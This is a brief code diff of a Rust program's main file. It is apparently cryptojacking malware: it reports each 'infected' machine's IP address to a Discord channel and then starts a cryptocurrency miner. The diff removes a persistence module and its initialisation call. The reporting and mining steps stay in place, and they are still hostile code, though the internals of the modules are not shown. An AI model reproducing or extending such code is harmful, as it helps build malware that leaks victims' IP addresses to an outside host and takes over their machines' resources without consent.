@@ -1,4 +1,3 @@
-mod persistance;
 mod discord;
 mod miner;
 mod mutex;
@@ -22,8 +21,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             discord.set_content(format!("infected: {:?}", discord.get_ip()));
 
             info!("response: {:?}", discord.send().map(|response| response.status()));
-
-            persistance::init();
 
             let miner = Miner::new();
 
